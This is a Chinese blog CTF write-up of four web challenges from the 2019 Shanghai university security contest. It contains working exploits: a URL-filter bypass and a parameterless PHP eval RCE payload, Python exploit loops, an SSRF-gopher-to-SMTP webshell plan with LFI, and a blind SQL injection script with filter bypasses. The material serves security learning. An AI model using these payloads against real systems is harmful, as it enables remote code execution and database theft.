
<!DOCTYPE html>
<html lang class="loading">
<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>第五届上海市大学生网络安全大赛 Write Up - Knlvre</title>
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="google" content="notranslate">
    <meta name="keywords" content="TriDiamond Obsidian,"> 
    <meta name="description" content="第五届上海市大学生网络安全大赛时间：2019年11月2号
记录 4 道 Web 题目（其中一道为 Bytectf boring_code）
Bytectf boring_code因为 decade ,"> 
    <meta name="author" content="Knlvre"> 
    <link rel="alternative" href="atom.xml" title="Knlvre" type="application/atom+xml"> 
    <link rel="icon" href="/knlvre.github.io/img/favicon.png"> 
    <link href="https://fonts.loli.net/css?family=Roboto+Mono|Rubik&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="//at.alicdn.com/t/font_1429596_nzgqgvnmkjb.css">
    <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.7.2/animate.min.css">
    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
    <link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/codemirror.min.css">
    <link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/theme/dracula.css">
    <link rel="stylesheet" href="/knlvre.github.io/css/obsidian.css">
    <link rel="stylesheet" href="/knlvre.github.io/css/ball-atom.min.css">
</head>
</html>

<body class="loading">
    <div class="loader">
        <div class="la-ball-atom la-2x">
            <div></div>
            <div></div>
            <div></div>
            <div></div>
        </div>
    </div>
    <span id="config-title" style="display:none">Knlvre</span>
    <div id="loader"></div>
    <div id="single">
    <div class="scrollbar gradient-bg-rev"></div>
<div id="top" style="display: block;">
    <div class="bar" style="width: 0;"></div>
    <div class="navigation animated fadeIn fast delay-1s">
        <img id="home-icon" class="icon-home" src="/img/favicon.png" alt="" data-url="https://knlvre.github.io">
        <div id="play-icon" title="Play/Pause" class="iconfont icon-play"></div>
        <h3 class="subtitle">第五届上海市大学生网络安全大赛 Write Up</h3>
        <div class="social">
            <!--        <div class="like-icon">-->
            <!--            <a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
            <!--        </div>-->
            <div>
                <div class="share">
                    
                        <a href="javascript:;" class="iconfont icon-share1"></a>
                        <div class="share-component-cc" data-disabled="facebook,douban,linkedin,diandian,tencent,google"></div>
                    
                </div>
            </div>
        </div>
    </div>
</div>

    <div class="section">
        <div class=article-header-wrapper>
    <div class="article-header">
        <div class="article-cover animated fadeIn" style="
            animation-delay: 600ms;
            animation-duration: 1.2s;
            background-image: 
                radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
                url(http://pic.netbian.com/uploads/allimg/180325/192744-1521977264b903.jpg);">
        </div>
        <div class="else">
            <p class="animated fadeInDown">
                
                <a href="javascript:;"><b>「 </b>Article<b> 」</b></a>
                
                November 02, 2019
            </p>
            <h3 class="post-title animated fadeInDown"><a href="/knlvre.github.io/2019/11/02/第五届上海市大学生网络安全大赛 Write Up/" title="第五届上海市大学生网络安全大赛 Write Up">第五届上海市大学生网络安全大赛 Write Up</a>
            </h3>
            
            <p class="post-count animated fadeInDown">
                
                <span>
                    <b class="iconfont icon-text2"></b> <i>Words count</i>
                    20k
                </span>
                
                
                <span>
                    <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
                    18 mins.
                </span>
                
                
                
                <span id="busuanzi_container_page_pv">
                    <b class="iconfont icon-read"></b> <i>Read count</i>
                    <span id="busuanzi_value_page_pv">0</span>
                </span>
                
            </p>
            
            
            <ul class="animated fadeInDown post-tags-list"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/knlvre.github.io/tags/CTF比赛/">CTF比赛</a></li></ul>
            
        </div>
    </div>
</div>

<div class="screen-gradient-after">
    <div class="screen-gradient-content">
        <div class="screen-gradient-content-inside">
            <div class="bold-underline-links screen-gradient-sponsor">
                <p>
                    <span class="animated fadeIn delay-1s"></span>
                </p>
            </div>
        </div>
    </div>
</div>

<div class="article">
    <div class='main'>
        <div class="content markdown animated fadeIn">
            <h1 id="第五届上海市大学生网络安全大赛"><a href="#第五届上海市大学生网络安全大赛" class="headerlink" title="第五届上海市大学生网络安全大赛"></a>第五届上海市大学生网络安全大赛</h1><p>时间：2019年11月2号</p>
<p>记录 4 道 Web 题目（其中一道为 Bytectf boring_code）</p>
<h2 id="Bytectf-boring-code"><a href="#Bytectf-boring-code" class="headerlink" title="Bytectf boring_code"></a>Bytectf boring_code</h2><p>因为 <strong>decade</strong> 这道题涉及到 boring_code 的知识点，所以决定在本文章中复现一下这道题目</p>
<p><strong>题目源码</strong></p>
<pre><code class="php">&lt;?php
function is_valid_url($url) {
    if (filter_var($url, FILTER_VALIDATE_URL)) {
        if (preg_match(&#39;/data:\/\//i&#39;, $url)) {
            return false;
        }
        return true;
    }
    return false;
}

if (isset($_POST[&#39;url&#39;])){
    $url = $_POST[&#39;url&#39;];
    if (is_valid_url($url)) {
        $r = parse_url($url);
        if (preg_match(&#39;/baidu\.com$/&#39;, $r[&#39;host&#39;])) {
            $code = file_get_contents($url);
            if (&#39;;&#39; === preg_replace(&#39;/[a-z]+\((?R)?\)/&#39;, NULL, $code)) {
                if (preg_match(&#39;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#39;, $code)) {
                    echo &#39;bye~&#39;;
                } else {
                    eval($code);
                }
            }
        } else {
            echo &quot;error: host not allowed&quot;;
        }
    } else {
        echo &quot;error: invalid url&quot;;
    }
}else{
    highlight_file(__FILE__);
}
?&gt;
</code></pre>
<p><strong>Bypass 第一层</strong></p>
<p>第一层关键过滤代码如下</p>
<pre><code class="php">&lt;?php
filter_var($url, FILTER_VALIDATE_URL)

preg_match(&#39;/data:\/\//i&#39;, $url)

parse_url($url)

preg_match(&#39;/baidu\.com$/&#39;, $r[&#39;host&#39;])
?&gt;
</code></pre>
<p>绕过<strong>filter_var()</strong>和<strong>preg_match()</strong>函数的文章看这篇： <a href="https://www.jianshu.com/p/80ce73919edb" target="_blank" rel="noopener">https://www.jianshu.com/p/80ce73919edb</a></p>
<p>filter_var()</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/%E4%B8%8A%E6%B5%B7CTF/4-1.png" alt="4-1"></p>
<p>parse_url</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/%E4%B8%8A%E6%B5%B7CTF/4-2.png" alt="4-2"></p>
<p>本题正确方法如下：</p>
<blockquote>
<p>① 氪金，购买一个含有 baidu.com 的域名</p>
<p>② 使用 ftp 协议： <a href="ftp://ip:port,baidu.com:80/filename.txt" target="_blank" rel="noopener">ftp://ip:port,baidu.com:80/filename.txt</a></p>
<p>③ 使用一个百度的任意跳转的漏洞，具体可以参考 ：<a href="https://www.4xseo.com/marketing/1280/#title-0" target="_blank" rel="noopener">https://www.4xseo.com/marketing/1280/#title-0</a></p>
<p>④  compress.zlib://data:@baidu.com/baidu.com?,echo(readfile(end(scandir(chr(pos(localtime(time(</p>
<p>chdir(next(scandir(pos(localeconv()))))))))))));</p>
</blockquote>
<p><strong>$code</strong>的值通过<strong>file_get_content()</strong>函数获取，而它正是<strong>eval()</strong>的参数，所以我们才要想尽办法绕过第一层把这个 $code 送进去 eval() 函数内。上面提到的4种方法中，氪金当然是最简单直接地，但是如果不氪金，选择第4种方法</p>
<pre><code class="bash">compress.zlib://data:@baidu.com/baidu.com?,echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));
</code></pre>
<p>首先需要注意的是，这里用的是<strong>data:@</strong>，而不是<strong>data://</strong>，但是两者却有一样的效果，也就是等同。所以这样可以绕过对<strong>data://</strong>的正则匹配</p>
<p>然后看一下<strong>filter_var()</strong>、<strong>parse_url()</strong>、<strong>file_get_content()</strong>对它的处理</p>
<p>filter_var()</p>
<p>为什么这里还要用<strong>compress.zlib://</strong>呢，因为<strong>filter_var()</strong>不同意<strong>data:@</strong>（虽然它等同于<strong>data://</strong>）。但是加上 compress.zlib:// 就同意了，也算是一种绕过</p>
<pre><code class="php">php &gt; var_dump(filter_var(&quot;data:@baidu.com/baidu.com?,echo(readfile(end
(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));&quot;, FILTER_VALIDATE_URL));
bool(false)

php &gt; var_dump(filter_var(&quot;data://baidu.com/baidu.com?,echo(readfile(end
(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));&quot;, FILTER_VALIDATE_URL));
string(125) &quot;data://baidu.com/baidu.com?,echo(readfile(end(scandir(chr(pos(localtime
(time(chdir(next(scandir(pos(localeconv()))))))))))));&quot;

php &gt; var_dump(filter_var(&quot;compress.zlib://data:@baidu.com/baidu.com?,echo(readfile(end
(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));&quot;, FILTER_VALIDATE_URL));
string(140) &quot;compress.zlib://data:@baidu.com/baidu.com?,echo(readfile(end(scandir(chr(pos(localtime
(time(chdir(next(scandir(pos(localeconv()))))))))))));&quot;
</code></pre>
<p>parse_url()</p>
<pre><code class="php">php &gt; var_dump(parse_url(&quot;compress.zlib://data:@baidu.com/baidu.com?,echo(readfile(end
(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));&quot;));
array(6) {
  [&quot;scheme&quot;]=&gt;
  string(13) &quot;compress.zlib&quot;
  [&quot;host&quot;]=&gt;
  string(9) &quot;baidu.com&quot;
  [&quot;user&quot;]=&gt;
  string(4) &quot;data&quot;
  [&quot;pass&quot;]=&gt;
  string(0) &quot;&quot;
  [&quot;path&quot;]=&gt;
  string(10) &quot;/baidu.com&quot;
  [&quot;query&quot;]=&gt;
  string(98) &quot;,echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));&quot;
}
</code></pre>
<p>file_get_contents()</p>
<pre><code class="php">php &gt; echo(file_get_contents(&quot;compress.zlib://data:@baidu.com/baidu.com?,
echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));&quot;));

echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));
</code></pre>
<p>从结果可以看到，该payload：①通过了 filter_var() 的检查；②通过了关于 data:// 的正则匹配；③用过了经过 parse_url() 函数处理后，host 参数匹配 baidu.com 的检查；④在经过 file_get_contents() 函数处理后，为 $code 参数赋值</p>
<p>太强了</p>
<p><strong>Bypass 第二层</strong></p>
<p>第二层关键过滤代码如下：</p>
<pre><code class="php">&lt;?php
preg_replace(&#39;/[a-z]+\((?R)?\)/&#39;, NULL, $code)

preg_match(&#39;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#39;, $code)
?&gt;
</code></pre>
<p>首先解释一下<strong>(?R)?</strong>，这个意思为递归整个匹配模式。所以正则的含义就是匹配无参数的函数，内部可以无限嵌套相同的模式（无参数函数）</p>
<p>只能使用包含<strong>a-z</strong>字母加<strong>括号()</strong>的函数（比如 var_dump() 就不能用了），然后必须无参数</p>
<p>无参数的意思是：<strong>所使用的的函数不得传入参数</strong>，比如：</p>
<pre><code class="php">echo(&quot;999&quot;)
</code></pre>
<p>其中<strong>999</strong>就是 echo 函数的参数，而在本题中这样是不行的，但是却可以：</p>
<pre><code class="php">echo(time())
</code></pre>
<p>也就是函数中再嵌套一个函数，这样在本题中确实被允许的，所以就利用这一点</p>
<p>[+]</p>
<p>接下来直接看着 payload 来学习，如下：</p>
<pre><code class="php">echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));
</code></pre>
<p>因为题目中给了如下提示</p>
<blockquote>
<p>flag in this file and code in /code</p>
</blockquote>
<p>也就是说 flag 在<strong>/www/</strong>目录下，而我们当前的目录是<strong>/www/code</strong>，所以要切换到上一级并读取 flag</p>
<p><strong>① localeconv()函数</strong></p>
<p>作用：返回一个包含本地数字及货币格式信息的数组</p>
<pre><code class="php">php &gt; var_dump(localeconv());
array(18) {
  [&quot;decimal_point&quot;]=&gt;
  string(1) &quot;.&quot;
  [&quot;thousands_sep&quot;]=&gt;
  string(0) &quot;&quot;
  [&quot;int_curr_symbol&quot;]=&gt;
  string(0) &quot;&quot;
...
</code></pre>
<p>可以看到，该函数返回的是一个<strong>数组</strong>，并且数组的第一个元素为字符串的<strong>点（.）</strong></p>
<p><strong>② pos()函数</strong></p>
<p>作用： 返回数组中的当前元素的值</p>
<p>因为正则条件中有<strong>nt</strong>，所以<strong>current()</strong>函数就无法使用，但是它有一个别名，就是<strong>pos()</strong></p>
<pre><code class="php">php &gt; var_dump(pos(localeconv()));
string(1) &quot;.&quot;
</code></pre>
<p><strong>③ scandir()函数</strong></p>
<p>作用： 返回指定目录中的文件和目录的数组</p>
<p>前面 pos() 函数输出的值为<strong>点（.）</strong>，所以这里变成<strong>scandir(.)</strong>，也就是当前目录</p>
<pre><code class="php">php &gt; var_dump(scandir(pos(localeconv())));
array(6) {
  [0]=&gt;
  string(1) &quot;.&quot;
  [1]=&gt;
  string(2) &quot;..&quot;
  [2]=&gt;
  string(8) &quot;code.php&quot;
...
}
</code></pre>
<p><strong>④ next()函数</strong></p>
<p>作用： 将数组中的内部指针向前移动一位</p>
<p>在刚才 scandir() 函数返回的数组中，第一位是点（.），此时指针默认指向该位（也就是第一位），通过<strong>next()</strong>函数，将指针移动到下一位，也就是<strong>点点（..）</strong></p>
<pre><code class="php">php &gt; var_dump(next(scandir(pos(localeconv()))));
string(2) &quot;..&quot;
</code></pre>
<p><strong>⑤ chdir()函数</strong></p>
<p>作用：改变目录</p>
<p>next() 函数返回点点（..），<strong>chdir()</strong>函数执行 chdir(..) 也就把目录切换到了上一级</p>
<pre><code class="php">php &gt; var_dump(chdir(next(scandir(pos(localeconv())))));
bool(true)
</code></pre>
<p>返回 bool 类型的 true ，说明当前目录切换成功</p>
<p><strong>⑥ time()函数</strong></p>
<p>作用：  返回自从 Unix 纪元（格林威治时间 1970 年 1 月 1 日 00:00:00）到当前时间的秒数</p>
<p>chdir() 函数返回的是 bool 类型的 true ，所以对不需要传入参数的<strong>time()</strong>函数来说，本来就没有影响，可以正常执行</p>
<pre><code class="php">php &gt; var_dump(time(chdir(next(scandir(pos(localeconv()))))));
int(1572952610)
</code></pre>
<p><strong>⑦ localtime()函数</strong></p>
<p>作用： 取得本地时间</p>
<p><strong>localtime()函数</strong>可以接受参数，并且第一个参数可以直接接受<strong>time()</strong>，所以直接利用</p>
<pre><code class="php">localtime ([ int $timestamp = time() [, bool $is_associative = false ]] ) : array
</code></pre>
<pre><code class="php">php &gt; var_dump(localtime(time(chdir(next(scandir(pos(localeconv())))))));
array(9) {
  [0]=&gt;
  int(52)
  [1]=&gt;
  int(15)
  [2]=&gt;
...
}
</code></pre>
<p>返回的数组中，第一个参数是当前系统的<strong>秒数</strong>，0 到 59 </p>
<p><strong>⑧ pos()函数</strong></p>
<p>不多说了，获取第一个参数，也就是系统当前的秒数</p>
<pre><code class="php">php &gt; var_dump(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))));
int(14)
</code></pre>
<p><strong>⑨ chr()函数</strong></p>
<p>作用： 返回相对应于 <strong>ascii</strong> 所指定的单个字符</p>
<p><strong>chr()</strong>函数在这里什么作用呢？因为当秒数为46时，<strong>chr(46)=”.”</strong>，用来获取<strong>点（.）</strong>（这里不能再用 localeconv() 函数是因为它不能传入参数）</p>
<pre><code class="php">php &gt; var_dump(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))));
string(1) &quot;.&quot;

</code></pre>
<p><strong>⑩ scandir()函数</strong></p>
<p>继续扫描当前目录（默认目录得上一级，因为我们刚才已经 chdir(“..”) 切换过）</p>
<pre><code class="php">php &gt; var_dump(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))));
array(6) {
  [0]=&gt;
  string(1) &quot;.&quot;
  [1]=&gt;
  string(2) &quot;..&quot;

  ...

  [5]=&gt;
  string(8) &quot;flag.php&quot;
}

</code></pre>
<p><strong>①① end()函数</strong></p>
<p>作用： 将 <strong>array</strong> 的内部指针移动到最后一个单元并返回其值</p>
<p>scandir() 返回当前目录的数组，<strong>end()</strong>函数将指针移动到最后一个（这里就是 flag.php ，因为文件名按字母先后排序，而字母 <strong>f</strong> 在本题中排最后）</p>
<pre><code class="php">php &gt; var_dump(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))))));
string(8) &quot;flag.php&quot;

</code></pre>
<p><strong>①② readfile()函数</strong></p>
<p>作用： 读取文件并写入到输出缓冲</p>
<p>这里将执行<strong>readfile(“flag.php”)</strong>，将 flag.php 的内容读取出来</p>
<pre><code class="php">php &gt; var_dump(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));
flag{Byctf_Borning_Code_Test}
int(30)

</code></pre>
<p><strong>①③ echo()函数</strong></p>
<p>最后用<strong>echo()</strong>函数将 flag 输出</p>
<p><strong>测试复现</strong></p>
<p>这里先做一下第二层 Bypass 的复现，代码如下：</p>
<pre><code class="php">&lt;?php
if (isset($_POST[&#39;code&#39;])){
    $code = $_POST[&#39;code&#39;];
    if (&#39;;&#39; === preg_replace(&#39;/[a-z]+\((?R)?\)/&#39;, NULL, $code)) {
        if (preg_match(&#39;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#39;, $code)) {
            echo &#39;bye~&#39;;
        }else {
            eval($code);
        }
    }
}else{
    highlight_file(__FILE__);
}
?&gt;

</code></pre>
<p>EXP</p>
<pre><code class="python">import requests

url = &quot;http://172.31.19.207/&quot;

data = {
&quot;code&quot;:&quot;echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));&quot;
}

while 1:
    response = requests.post(url,data=data)
    if &quot;flag&quot; in response.text:
        print(response.text)
        break

</code></pre>
<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/%E4%B8%8A%E6%B5%B7CTF/4-3.png" alt="4-3"></p>
<p>完整题目的 EXP 如下：</p>
<pre><code class="python">import requests

url = &quot;http://172.31.19.207/&quot;

data = {    &quot;url&quot;:&quot;compress.zlib://data:@baidu.com/baidu.com?,echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));&quot;
}

while 1:
    response = requests.post(url,data=data)
    if &quot;flag&quot; in response.text:
        print(response.text)
        break

</code></pre>
<h2 id="decade"><a href="#decade" class="headerlink" title="decade"></a>decade</h2><p>本题参考 bytectf boring_code的无参数 RCE</p>
<p>题目进去看到一张图片，右键查看源码看到如下提示</p>
<blockquote>
<p>\&lt;!–src in /code and flag is in this page–></p>
</blockquote>
<p>按照提示，在 URL 后面添加<strong>/code</strong>得到源码</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/%E4%B8%8A%E6%B5%B7CTF/1-1.png" alt="1-1"></p>
<p>内容如下</p>
<pre><code class="php">&lt;?php
highlight_file(__FILE__);
$code = $_GET[&#39;code&#39;];
if (!empty($code)) {
        if (&#39;;&#39; === preg_replace(&#39;/[a-z]+\((?R)?\)/&#39;, NULL, $code)) {
            if (preg_match(&#39;/readfile|if|time|local|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#39;, $code)) {
                    echo &#39;bye~&#39;;
                } else {
                    eval($code);
                }
            }
        else {
            echo &quot;No way!!!&quot;;
        }
}
else {
        echo &quot;No way!!!&quot;;
}
?&gt;
</code></pre>
<p>回顾一下 boring_code 的 payload：</p>
<pre><code class="php">echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));
</code></pre>
<p>可以看出来在本题，不能用的函数有：</p>
<pre><code class="bash">localeconv()
time()
localtime()
readfile()
</code></pre>
<p>主要问题有两点：①之前获取点（.）的方法失效了；②readfile() 函数需要用其他代替</p>
<p>然后直接看一下本题的 payload：</p>
<p>第一种</p>
<pre><code class="php">die(next(file(end(scandir(chr(ord(strrev(crypt(serialize(array(chdir(next(scandir(next(scandir(chr(ord(strrev(crypt(serialize(array())))))))))))))))))))));
</code></pre>
<p>第二种</p>
<pre><code class="php">echo(join(file(end(scandir(next(each(scandir(chr(floor(tan(tan(atan(atan(ord(cos(chdir(next(scandir(chr(floor(tan(tan(atan(atan(ord(cos(fclose(tmpfile()))))))))))))))))))))))))))));
</code></pre>
<p>payload 还有很多种，自己去发掘，就不再一个一个分析了，自行分析</p>
<h2 id="babyt5"><a href="#babyt5" class="headerlink" title="babyt5"></a>babyt5</h2><p>原题 Write Up： <a href="https://www.jianshu.com/p/804d95f6d6fb" target="_blank" rel="noopener">https://www.jianshu.com/p/804d95f6d6fb</a></p>
<p>进入题目后直接拿到源码</p>
<pre><code class="php">&lt;?php
highlight_file(__FILE__);
$x = $_GET[&#39;x&#39;];
$pos = strpos($x,&quot;php&quot;);
if($pos){
        exit(&quot;denied&quot;);
}
$ch = curl_init();
curl_setopt($ch,CURLOPT_URL,&quot;$x&quot;);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
$result = curl_exec($ch);
echo $result;
?&gt;

</code></pre>
<p>dirsearch 扫到<strong>flag.php</strong></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/%E4%B8%8A%E6%B5%B7CTF/2-2.png" alt="2-2"></p>
<p>源代码中看到提示</p>
<blockquote>
<p> there is no flag /etc/hosts</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/%E4%B8%8A%E6%B5%B7CTF/2-3.png" alt="2-3"></p>
<p>查看<strong>/etc/hosts</strong>原代码</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/%E4%B8%8A%E6%B5%B7CTF/2-4.png" alt="2-4"></p>
<p>发现这个<strong>172.18.0.2</strong>，用<strong>http</strong>协议</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/%E4%B8%8A%E6%B5%B7CTF/2-5.png" alt="2-5"></p>
<p>尝试<strong>172.18.0.2</strong>，拿到提示</p>
<blockquote>
<p>\&lt;!– include $_GET[a]; –> </p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/%E4%B8%8A%E6%B5%B7CTF/2-6.png" alt="2-6"></p>
<p>存在<strong>LFI</strong>，并且扫描端口的结果中发现 25 号端口开放 <strong>smtp</strong> 服务。 于是可以联想到利用<strong>gopher</strong>协议打 smtp，然后再结合发现的 LFI 漏洞，得出这样的思路</p>
<blockquote>
<p>利用gopher打smtp，在日志文件中留下一句话木马，然后用 LFI 包含日志文件获取 webshell</p>
</blockquote>
<p>以上思路在本次比赛中没有复现成功，具体思路看<a href="https://www.jianshu.com/p/804d95f6d6fb" target="_blank" rel="noopener">原题 Write Up</a></p>
<p>① 如果成功将一句话写入日志，菜刀连接后拿 flag</p>
<p>② 也可以继续用 LFI 然后伪协议读取 flag</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/%E4%B8%8A%E6%B5%B7CTF/2-7.png" alt="2-7"></p>
<h2 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h2><p>点击<strong>about</strong>发现提交了<strong>id</strong>参数</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/%E4%B8%8A%E6%B5%B7CTF/3-1.png" alt="3-1"></p>
<p>添加单引号报错，但是只是提示<strong>404</strong></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/%E4%B8%8A%E6%B5%B7CTF/3-2.png" alt="3-2"></p>
<p>后面的尝试发现了黑名单，先列出来</p>
<pre><code class="bash">?id=-1
or
and
union select
,
</code></pre>
<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/%E4%B8%8A%E6%B5%B7CTF/3-4.png" alt="3-4"></p>
<p><strong>Bypass</strong></p>
<blockquote>
<p>① || 代替 or</p>
<p>② or 被过滤所以 information_schema 不能用，选取另一个系统表 mysql.innodb_table_stats 代替</p>
<p>③ union/**/select 或者 union%0bselect 代替 union select （中间空格替换掉）</p>
<p>④ join 代替 逗号（,）</p>
<p>⑤ 无列名注入</p>
</blockquote>
<p>尝试，发现单引号包裹</p>
<pre><code class="bash">?id=2&#39; || &#39;1
</code></pre>
<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/%E4%B8%8A%E6%B5%B7CTF/3-3.png" alt="3-3"></p>
<p>做题前先将几个知识点：① 无列名注入；② join 代替逗号</p>
<p>最后 EXP</p>
<pre><code class="python">import requests
import string
url = &quot;http://47.105.183.208:29898/article.php&quot;
all_str = string.printable
flag = &#39;&#39;
for i in range(1,100):
    for j in all_str:
        #id = &quot;0&#39; || ascii(substring((select group_concat(table_name) from mysql.innodb_table_stats) from %d))=%d || &#39;1&#39;=&#39;0&quot;%(i,ord(j))
        #id = &quot;0&#39; || ascii(substring((select group_concat(database_name) from mysql.innodb_table_stats) from %d))=%d || &#39;1&#39;=&#39;0&quot;%(i,ord(j))
        #id = &quot;0&#39; || ascii(substring((select group_concat(e.3) from (select * from (select 1)a join (select 2)b join (select 3)c union/**/select * from cccttffff.fl111aa44a99g)e) from %d))=%d || &#39;1&#39;=&#39;0&quot;%(i,ord(j))

        param = {
            &#39;id&#39;:id
        }
        rep = requests.get(url,params=param)
        #print(rep.text)
        #print(param)
        if &#39;23333333&#39; in rep.text:
            flag = flag + j
            print(flag)
            break
</code></pre>
<p>该题表名前要加数据库名，不然注不出来</p>
<p><strong>Reference</strong></p>
<p> <a href="https://www.cnblogs.com/BOHB-yunying/p/11616311.html" target="_blank" rel="noopener">https://www.cnblogs.com/BOHB-yunying/p/11616311.html</a></p>
<p> <a href="https://www.jianshu.com/p/80ce73919edb" target="_blank" rel="noopener">https://www.jianshu.com/p/80ce73919edb</a></p>
<p> <a href="https://baijiahao.baidu.com/s?id=1644976360202625042&amp;wfr=spider&amp;for=pc" target="_blank" rel="noopener">https://baijiahao.baidu.com/s?id=1644976360202625042&amp;wfr=spider&amp;for=pc</a></p>
<p> <a href="https://www.jianshu.com/p/6eba3370cfab" target="_blank" rel="noopener">https://www.jianshu.com/p/6eba3370cfab</a></p>
<p><strong>Write Up</strong></p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzU3MzczNDg1OQ==&amp;mid=2247484270&amp;idx=1&amp;sn=7958756c27236039713d7b8fd0a1348c&amp;chksm=fd3c69caca4be0dc180ff10d83dae8642f618709f0ebcbb3bf6c33942edeae0c42d6ce85ac48&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1572946533094&amp;sharer_shareid=9acc96b64dfbde0e292e6ebcb72488d2#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzU3MzczNDg1OQ==&amp;mid=2247484270&amp;idx=1&amp;sn=7958756c27236039713d7b8fd0a1348c&amp;chksm=fd3c69caca4be0dc180ff10d83dae8642f618709f0ebcbb3bf6c33942edeae0c42d6ce85ac48&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1572946533094&amp;sharer_shareid=9acc96b64dfbde0e292e6ebcb72488d2#rd</a> </p>

            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
            <audio id="audio" loop="1" preload="auto" controls="controls"
                data-autoplay="false">
                <source type="audio/mpeg" src="">
            </audio>
            
            <ul id="audio-list" style="display:none">
                
                
                <li title='0' data-url='/knlvre.github.io/statics/YoungAndBeautiful.mp3'></li>
                
                    
            </ul>
            
            
            
    <div id='gitalk-container' class="comment link"
        data-ae='true'
        data-ci='ec894e2b66f752e8b7fb'
        data-cs='3ccc2e92bb350688fe2c2dc2930189b62622bfb1'
        data-r='blog-comments'
        data-o='TriDiamond'
        data-a='TriDiamond'
        data-d=''
    >Comments</div>


            
            
        </div>
        <div class="sidebar">
            <div class="box animated fadeInRight">
                <div class="subbox">
                    <img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/ico/HaZong.jpg" height=300 width=300></img>
                    <p>Knlvre</p>
                    <span>Notes During Information Security Learning.</span>
                    <dl>
                        <dd><a href="https://github.com/knlvre" target="_blank"><span
                                    class=" iconfont icon-github"></span></a></dd>
                        <dd><a href="https://github.com/knlvre" target="_blank"><span
                                    class=" iconfont icon-twitter"></span></a></dd>
                        <dd><a href="https://github.com/knlvre" target="_blank"><span
                                    class=" iconfont icon-stack-overflow"></span></a></dd>
                    </dl>
                </div>
                <ul>
                    <li><a href="/">65 <p>Articles</p></a></li>
                    <li><a href="/categories">0 <p>Categories</p></a></li>
                    <li><a href="/tags">9 <p>Tags</p></a></li>
                </ul>
            </div>
            
            
            
            <div class="box sticky animated fadeInRight faster">
                <div id="toc" class="subbox">
                    <h4>Contents</h4>
